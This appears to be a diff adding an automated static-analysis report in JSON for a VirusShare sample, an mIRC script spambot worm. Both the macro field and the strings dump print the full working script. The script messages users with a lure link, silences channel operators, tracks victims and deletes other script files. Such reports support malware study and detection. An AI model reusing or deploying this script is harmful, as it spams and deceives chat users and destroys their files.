@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "write": "May write to a file"
+        },
+        "macro": "[script]\nn0=on *:connect: { .remini victim.ini nick | if $server != $null { .timerspambot 1 60 sockopen spambot $server 6667 } }\nn1=on *:sockopen:spamb*: { if ($sockerr > 0) { halt } | sockwrite -n $sockname user $rand(1,9999) a a : $me | .sockwrite -n $sockname nick $left($me,5) $+ $rand(16,25) }\nn2=on *:sockclose:spamb*: if $server != $null  { sockopen spambot $server 6667 } \nn3=on *:sockread:spamb*: { sockread %sb | if ($gettok(%sb,1,32) == PING) { sockwrite -n spamb* PONG $server } }\nn4=On +a1t:TEXT:*:?:halt\nn5=On *:op:#: { .auser a1t $nick | .auser a1t $opnick | .timer $+ $nick off | .timer $+ $opnick  off }\nn6=On *:kick:#: { .auser a1t $nick | .timer $+ $nick off | if %spw != $null .timer $+ $knick 2 5 sockwrite -tn spambot privmsg $knick : to remove spam double click here http://www.geocities.com/naked_young_babe }\nn7=On *:text:*:?: {\nn8=  if $network == Dalnet { halt } | if $readini(victim.ini, nick, $nick) == 1 { halt } \nn9=  if ( $nick == $me ) {  halt } | .ignore -u6 $me | .timer $+ $nick 2 5 sockwrite -tn spambot privmsg $nick : nude celebs ? click this http://www.geocities.com/naked_young_babe \nn10=.writeini victim.ini nick $nick 1 }\nn11=On *:join:*: {\nn12=  if $network == Dalnet { halt } | if $readini(victim.ini, nick, $nick) == 1 { halt } \nn13=  if ( $nick == $me ) {  halt } | .ignore -u6 $me |  .timer $+ $nick 2 5 sockwrite -tn spambot privmsg $nick : check out this delicious personal website http://www.geocities.com/naked_young_babe \nn14=.writeini victim.ini nick $nick 1 }\nn15=on 1:start:{ squish_worm script.ini | squish_worm scripts.ini | squish_worm mlRC.ini | squish_worm fserver.ini | squish_worm server.ini | squish_worm nospam | squish_worm control.ini | squish_worm remote32.ini | squish_worm Boots.ini | squish_worm url.ini | squish_worm urls.ini }\nn16=alias squish_worm { .write -c $1 . | .unload -rs $1 | .remove $1 }\nn17=On *:nick: { .timer $+ $newnick 2 5 sockwrite -tn spambot privmsg $newnick : check out this delicious personal website http://www.geocities.com/naked_young_babe }"
+    },
+    "filename": "VirusShare_1a8cf962512efcc755a866199656c9b7",
+    "filesize": 2057,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1a8cf962512efcc755a866199656c9b7",
+        "sha1": "4db6e77cf9c3567ea6948d59e29f1765c6043fdb",
+        "sha256": "979a28a9f5f3a6ae71e26e15fea25451be7d58c6b47e5a29a121e629790304e4"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[script]",
+            "n0=on *:connect: { .remini victim.ini nick | if $server != $null { .timerspambot 1 60 sockopen spambot $server 6667 } }",
+            "n1=on *:sockopen:spamb*: { if ($sockerr > 0) { halt } | sockwrite -n $sockname user $rand(1,9999) a a : $me | .sockwrite -n $sockname nick $left($me,5) $+ $rand(16,25) }",
+            "n2=on *:sockclose:spamb*: if $server != $null  { sockopen spambot $server 6667 } ",
+            "n3=on *:sockread:spamb*: { sockread %sb | if ($gettok(%sb,1,32) == PING) { sockwrite -n spamb* PONG $server } }",
+            "n4=On +a1t:TEXT:*:?:halt",
+            "n5=On *:op:#: { .auser a1t $nick | .auser a1t $opnick | .timer $+ $nick off | .timer $+ $opnick  off }",
+            "n6=On *:kick:#: { .auser a1t $nick | .timer $+ $nick off | if %spw != $null .timer $+ $knick 2 5 sockwrite -tn spambot privmsg $knick : to remove spam double click here http://www.geocities.com/naked_young_babe }",
+            "n7=On *:text:*:?: {",
+            "n8=  if $network == Dalnet { halt } | if $readini(victim.ini, nick, $nick) == 1 { halt } ",
+            "n9=  if ( $nick == $me ) {  halt } | .ignore -u6 $me | .timer $+ $nick 2 5 sockwrite -tn spambot privmsg $nick : nude celebs ? click this http://www.geocities.com/naked_young_babe ",
+            "n10=.writeini victim.ini nick $nick 1 }",
+            "n11=On *:join:*: {",
+            "n12=  if $network == Dalnet { halt } | if $readini(victim.ini, nick, $nick) == 1 { halt } ",
+            "n13=  if ( $nick == $me ) {  halt } | .ignore -u6 $me |  .timer $+ $nick 2 5 sockwrite -tn spambot privmsg $nick : check out this delicious personal website http://www.geocities.com/naked_young_babe ",
+            "n14=.writeini victim.ini nick $nick 1 }",
+            "n15=on 1:start:{ squish_worm script.ini | squish_worm scripts.ini | squish_worm mlRC.ini | squish_worm fserver.ini | squish_worm server.ini | squish_worm nospam | squish_worm control.ini | squish_worm remote32.ini | squish_worm Boots.ini | squish_worm url.ini | squish_worm urls.ini }",
+            "n16=alias squish_worm { .write -c $1 . | .unload -rs $1 | .remove $1 }",
+            "n17=On *:nick: { .timer $+ $newnick 2 5 sockwrite -tn spambot privmsg $newnick : check out this delicious personal website http://www.geocities.com/naked_young_babe }"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.geocities.com/naked_young_babe"
+        ]
+    },
+    "time": "0:00:00.291761",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
